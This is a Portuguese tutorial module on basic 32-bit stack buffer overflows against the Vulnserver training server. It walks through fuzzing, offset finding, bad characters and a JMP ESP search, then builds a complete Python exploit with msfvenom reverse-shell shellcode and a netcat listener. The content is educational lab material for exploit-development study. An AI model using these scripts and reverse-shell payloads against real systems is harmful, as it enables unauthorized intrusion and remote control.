# 💥 10. Buffer Overflow Básico

> Controlar o instruction pointer (EIP) é controlar a execução inteira. Este módulo ensina o fluxo completo: crash → offset → bad chars → JMP ESP → shellcode → shell.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 120min | ⭐⭐⭐⭐ Avançado | `Immunity Debugger, mona.py, msfvenom, pattern_create.rb, Python` |

</div>

---

## 🎓 Por que isso importa?

Buffer overflow é a base de exploit development. Entender como um buffer malicioso sobrescreve o instruction pointer (EIP) permite manipular o fluxo de execução de qualquer programa. Este módulo foca em **stack-based overflows em 32-bit**, o modelo mais didático e o que o OSCP avalia.

**⚠️ Contexto:** Este é um tópico introdutório. Binários modernos usam proteções como ASLR, DEP/NX, Stack Canaries e CFG — este tutorial usa um binário **sem essas proteções** para ensinar a mecânica fundamental.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Registers x86 básicos | Sim | Este módulo (abaixo) |
| Python básico | Sim | Módulo 00 |
| Metasploit (msfvenom, msfconsole) | Sim | Arquivo 08 |
| Rede (IP, portas, TCP) | Sim | Módulo 00 |

---

## 🎯 Quando usar este módulo

- Encontrou serviço com input longo que causa crash
- Quer entender como exploits funcionam por baixo
- Está se preparando para OSCP/OSEP
- Quer aprender exploit development manual

---

## 🧠 Fundamentos: Registradores e Stack

### Registradores x86

| Registrador | Nome | Função |
|:------------|:-----|:-------|
| **EIP** | Extended Instruction Pointer | Aponta para a **próxima instrução** a executar. O alvo do atacante — controlar EIP = controlar tudo. |
| **ESP** | Extended Stack Pointer | Aponta para o **topo da stack**. Atualizado automaticamente por PUSH/POP/CALL/RET. |
| **EBP** | Extended Base Pointer | Aponta para a **base do frame** atual. Referência para variáveis locais. |
| **EAX, EBX, ECX, EDX** | General Purpose | Registradores de uso geral. |

**x64 equivalents:** RIP, RSP, RBP (64 bits cada).

**Little-endian:** x86 armazena endereços com o byte menos significativo primeiro. Ex: `0x62501203` → `\x03\x12\x50\x62` no buffer.

### Como a Stack funciona

A stack é uma região de memória que **cresce de endereços altos para baixo**.

**Operações fundamentais:**

| Instrução | O que faz |
|:----------|:----------|
| `PUSH valor` | Decrementa ESP em 4 bytes, escreve valor no topo |
| `POP reg` | Lê valor do topo, incrementa ESP |
| `CALL endereco` | Empurra return address na stack, salta para endereço |
| `RET` | Pop return address → EIP (retorna à função chamadora) |

**Layout do frame:**
```
Endereços altos
┌──────────────────────────────────┐
│ Argumentos da função chamadora    │  EBP+0x08, EBP+0x0C...
├──────────────────────────────────┤
│ Return Address (saved EIP)       │  EBP+0x04  ← ALVO DO ATACANTE
├──────────────────────────────────┤
│ Saved EBP (frame pointer)        │  EBP
├──────────────────────────────────┤
│ Variáveis locais / buffer        │  EBP-0x04, EBP-0x08...
│ (buffer cresce "para cima")      │
├──────────────────────────────────┤
ESP → (topo da stack)              │  Endereço mais baixo
Endereços baixos
```

### Por que o Overflow sobrescreve EIP

Quando uma função copia dados para um buffer **sem verificar tamanho**, os bytes extras "vazam" para cima (endereços maiores), ultrapassando:

1. O buffer (variáveis locais)
2. O saved EBP
3. O **saved return address (EIP)**

Quando `RET` é executado, o CPU pega o valor que agora é **controlado pelo atacante** e coloca em EIP.

```
ANTES do overflow:              DEPOIS do overflow (260 bytes):
┌──────────────────────┐       ┌──────────────────────┐
│ Saved EIP → caller   │       │ 0x41414141 ("AAAA")  │ ← EIP SOBRESCRITO!
├──────────────────────┤       ├──────────────────────┤
│ Saved EBP            │       │ 0x41414141 ("AAAA")  │ ← EBP sobrescrito
├──────────────────────┤       ├──────────────────────┤
│ buf[200]             │       │ AAAAAA...AAAA (200B) │ ← buffer original
└──────────────────────┘       └──────────────────────┘
```

---

## 🎯 Alvo de Prática: Vulnserver

**Vulnserver** é um servidor TCP com vulnerabilidades intencionais, criado para treinamento. Escuta na porta 9999 e aceita comandos. O comando **TRUN** possui buffer overflow — aceita input ilimitado.

**Onde baixar:** `https://github.com/stephenbradshaw/vulnserver`

**Como rodar:**
1. Baixe `vulnserver.exe` no Windows
2. Abra o Immunity Debugger
3. File → Open → selecione `vulnserver.exe`
4. Pressione F9 para executar
5. O servidor escuta na porta 9999

**Do Kali (atacante):**
```bash
# Conectar ao vulnserver
nc 192.168.56.20 9999

# Output:
Welcome to Vulnerable Server! Enter a command:
TRUN /.:/
```

---

## 🔄 Fluxo Completo de Exploração

### Etapa 1: Fuzzing Inicial

**Objetivo:** Descobrir qual comando causa crash e o tamanho aproximado do buffer.

```python
#!/usr/bin/env python3
import socket
import time

host = "192.168.56.20"
port = 9999

buffer = []
counter = 100

while counter <= 3000:
    buffer.append("A" * counter)
    counter += 100

for i in range(len(buffer)):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)
        payload = "TRUN /.:/" + buffer[i]
        s.send(payload.encode())
        s.close()
        time.sleep(1)
        print(f"[*] Sent {len(buffer[i])} bytes")
    except:
        print(f"[+] Crash at {len(buffer[i])} bytes")
        break
```

**Output esperado:**
```
[*] Sent 100 bytes
[*] Sent 200 bytes
...
[*] Sent 2700 bytes
[*] Sent 2800 bytes
[+] Crash at 2900 bytes
```

No Immunity Debugger: EIP será `41414141` (hex de "AAAA"), confirmando que controlamos o instruction pointer.

### Etapa 2: Encontrar Offset Exato

**Passo 1 — Gerar pattern:**

```bash
# No Kali:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

**Output:**
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3...
```

**Passo 2 — Enviar pattern e causar crash:**

```python
#!/usr/bin/env python3
import socket

host = "192.168.56.20"
port = 9999

# Colar o pattern gerado aqui
pattern = "Aa0Aa1Aa2Aa3..."  # (3000 bytes)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(b"TRUN /.:/" + pattern.encode())
s.close()
```

**Passo 3 — Ler EIP no crash:** No Immunity, após o crash, EIP mostra algo como `386F4337`.

**Passo 4 — Encontrar offset:**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
```

**Output:**
```
[*] Exact match at offset 2003
```

**Alternativa com mona.py (no Immunity):**
```
!mona pc 3000
!mona findmsp -distance 3000
```

### Etapa 3: Verificar Controle Total

```python
#!/usr/bin/env python3
import socket

host = "192.168.56.20"
port = 9999

offset = 2003
buffer = b"A" * offset + b"BBBB" + b"C" * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(b"TRUN /.:/" + buffer)
s.close()
```

**Output esperado no Immunity:**
```
EIP: 42424242    ← "BBBB" — controle confirmada!
ESP: CCCC....    ← ESP aponta para nosso buffer
```

Se EIP = `42424242` (hex de "BBBB"), temos controle total do fluxo.

### Etapa 4: Identificar Bad Characters

Bad characters são bytes que o programa não processa corretamente e que precisam ser excluídos do shellcode.

**Passo 1 — Gerar byte array com mona:**
```
!mona bytearray -b "\x00"
```

**Passo 2 — Montar array no exploit e enviar:**

```python
#!/usr/bin/env python3
import socket

host = "192.168.56.20"
port = 9999

offset = 2003
jmp_esp = b"\x03\x12\x50\x62"  # endereço exemplo (será substituído)

# Byte array completo (\x01 a \xff — \x00 é sempre bad)
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload = b"TRUN /.:/"
payload += b"A" * offset
payload += jmp_esp
payload += b"\x90" * 16  # NOP sled
payload += badchars
payload += b"C" * (3000 - len(payload))  # padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(payload)
s.close()
```

**Passo 3 — Comparar com mona:**
```
!mona compare -f C:\mona\bytearray.bin -a <endereço_ESP>
```

**Output esperado:**
```
Comparing results...
  \x00    ← bad (sempre, terminador de string)
  \x0a    ← bad (newline)
  \x0d    ← bad (carriage return)
```

**Bad chars comuns:** `\x00` (null), `\x0a` (LF), `\x0d` (CR).

### Etapa 5: Encontrar JMP ESP

**Por que JMP ESP?** Após `RET`, ESP aponta para o espaço logo após o saved EIP — onde colocamos o shellcode. `JMP ESP` redireciona a execução para lá.

**Passo 1 — Listar módulos:**
```
!mona modules
```

**Output esperado:**
```
Module info      | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | ...
essfunc.dll      | False  | False   | False | False    | False  | ...
vulnserver.exe   | False  | False   | False | False    | False  | ...
WS2_32.dll       | True   | True    | True  | True     | True   | ...
KERNEL32.dll     | True   | True    | True  | True     | True   | ...
```

**Critérios:** `ASLR=False`, `Rebase=False`, `SafeSEH=False`, `OS Dll=False` → `essfunc.dll`.

**Passo 2 — Buscar JMP ESP:**
```
!mona jmp -r esp -m essfunc.dll -cpb "\x00\x0a\x0d"
```

**Output esperado:**
```
0x625011af : jmp esp | essfunc.dll
0x62501203 : jmp esp | essfunc.dll
0x6250120b : jmp esp | essfunc.dll
```

Escolher endereço **sem bad chars**. Exemplo: `0x625011af`.

**Little-endian:** `\xaf\x11\x50\x62`

### Etapa 6: Gerar Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c
```

| Flag | Significado |
|:-----|:------------|
| `-p` | Payload |
| `-b` | Bad characters a evitar |
| `-f` | Formato de saída (c = array C) |
| `-e` | Encoder (shikata_ga_nai) — opcional, não evita EDR moderno |

**Output esperado:**
```
Payload size: 351 bytes
Final size of c file: 353 bytes
unsigned char buf[] = 
"\xbb\xcb\x5c\x97\x27\xda\xdb\xd9\x74\x24\xf4\x5a\x29"
"\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x8e\x8b\x91"
"\x53\x6a\x9a\x94\x5e\x2f\x5f\x4e\x49\xde\x82\x3e\x67"
// ... (shellcode completo)
```

### Etapa 7: Montar o Exploit Final

**Estrutura do payload:**
```
[Padding A × 2003] [JMP ESP (4 bytes)] [NOP Sled (16 bytes)] [Shellcode]
```

**Script completo:**

```python
#!/usr/bin/env python3
import socket
import struct

# === CONFIGURAÇÃO ===
host = "192.168.56.20"
port = 9999

# === OFFSET (Etapa 2) ===
offset = 2003

# === JMP ESP (Etapa 5 — Little-endian) ===
jmp_esp = struct.pack("<I", 0x625011af)

# === NOP SLED ===
nops = b"\x90" * 16

# === SHELLCODE (Etapa 6) ===
shellcode = (
    b"\xbb\xcb\x5c\x97\x27\xda\xdb\xd9\x74\x24\xf4\x5a\x29"
    b"\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x8e\x8b\x91"
    # ... (copiar shellcode completo do msfvenom)
)

# === MONTAR PAYLOAD ===
payload = b"TRUN /.:/"
payload += b"A" * offset
payload += jmp_esp
payload += nops
payload += shellcode

# === ENVIAR ===
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send(payload)
    s.close()
    print("[*] Payload enviado!")
except Exception as e:
    print(f"[-] Erro: {e}")
```

**Antes de rodar, iniciar listener no Kali:**
```bash
nc -lvnp 4444
```

**Output esperado no listener:**
```
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.20] 49152
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\vulnserver>
```

**Fluxo de execução:**
1. `RET` pop `0x625011af` (JMP ESP) para EIP
2. ESP aponta para o NOP sled
3. `JMP ESP` → salta para o NOP sled
4. NOPs "deslizam" até o shellcode
5. Shellcode executa → reverse shell conecta ao listener

---

## 🛡️ Proteções Modernas (Contexto)

| Proteção | O que faz | Bypass (tópico avançado) |
|:---------|:----------|:------------------------|
| **ASLR** | Randomiza endereços a cada execução | Information leak + cálculo de base |
| **DEP/NX** | Stack não-executável | ROP (Return-Oriented Programming) |
| **Stack Canary** | Cookie entre buffer e saved EIP | Leak ou brute force |
| **SafeSEH** | Tabela de handlers SEH válidos | Gadget de módulo sem `/SAFESEH` |
| **CFG** | Verifica targets de chamadas indiretas | Data-only attacks |

Este tutorial usa binário **sem essas proteções** para ensinar a mecânica. Proteções são o próximo passo natural no exploit development.

---

## 🛠️ Immunity Debugger + mona.py

### Immunity Debugger

- **Download:** https://www.immunityinc.com/debugger/
- **Atalhos:** F2 = breakpoint, F7 = step into, F8 = step over, F9 = run
- **Painéis:** Registers, Stack, CPU, Log

### mona.py

- **Download:** https://github.com/corelan/mona3
- **Instalação:** Copiar `mona.py` para `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`
- **Testar:** Digitar `!mona` na command bar

### Comandos Principais

| Comando | Função |
|:--------|:-------|
| `!mona modules` | Lista módulos e proteções |
| `!mona pattern_create 3000` | Gera pattern cíclico |
| `!mona pattern_offset 386F4337` | Busca offset |
| `!mona findmsp -distance 3000` | Busca offset em todos os registros |
| `!mona jmp -r esp -m module.dll` | Busca JMP ESP |
| `!mona jmp -r esp -cpb "\x00\x0a\x0d"` | JMP ESP sem bad chars |
| `!mona bytearray -b "\x00"` | Gera byte array |
| `!mona compare -f bytearray.bin -a ESP` | Compara bytes na memória |
| `!mona seh` | Busca gadgets POP-POP-RET |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowoverflowoverflowoverflow) | Prática guiada com Vulnserver | 90min |
| 2 | OverTheWire | [Narnia](https://overthewire.org/wargames/narnia/) | Binário Linux local, shellcode injection | 45min |
| 3 | OverTheWire | [Behemoth](https://overthewire.org/wargames/behemoth/) | Exploit development Linux avançado | 60min |
| 4 | picoCTF | [CyLab Binary](https://play.picoctf.org/) | Binary exploitation challenges | 60min |
| 5 | HackTheBox | [Starting Point](https://app.hackthebox.com/starting-point) | Buffer overflow em HTB | 60min |

**Relação com LABS.md antigo:** Os 4 labs listados no LABS.md (Narnia, Behemoth, PicoCTF Binary, HTB Starting Point) que antes eram apontados como "sem respaldo no conteúdo" agora são **cobertos teoricamente por este arquivo**. Cada um desses labs requer técnicas de buffer overflow que este módulo ensina: fuzzing, offset, bad chars, shellcode, e shell.

---

## 📚 Referências

- [Corelan — Exploit Writing Tutorial Part 1](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [Corelan mona3](https://github.com/corelan/mona3)
- [TryHackMe Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowoverflowoverflowoverflow)
- [OverTheWire Narnia](https://overthewire.org/wargames/narnia/)
- [OverTheWire Behemoth](https://overthewire.org/wargames/behemoth/)
- [HackTricks — Stack Overflow](https://book.hacktricks.xyz/binary-exploitation/stack-overflow)
- [PayloadsAllTheThings — Binary Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Binary%20Exploitation)
- [Vulnserver GitHub](https://github.com/stephenbradshaw/vulnserver)
- [MITRE ATT&CK — Exploitation for Client Execution (T1204)](https://attack.mitre.org/techniques/T1204/002/)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Explicar como registradores EIP/ESP/EBP funcionam na stack
- [ ] Entender por que um buffer overflow sobrescreve o fluxo de execução
- [ ] Realizar fuzzing para encontrar crash
- [ ] Usar pattern_create.rb e pattern_offset.rb para encontrar offset exato
- [ ] Identificar bad characters com mona.py
- [ ] Encontrar JMP ESP com mona.py em módulo sem proteções
- [ ] Gerar shellcode com msfvenom evitando bad chars
- [ ] Montar exploit completo em Python com socket
- [ ] Obter shell reversa via buffer overflow
- [ ] Nomear as 4 proteções modernas (ASLR, DEP, Canary, SafeSEH) e explicar por que este tutorial as evita
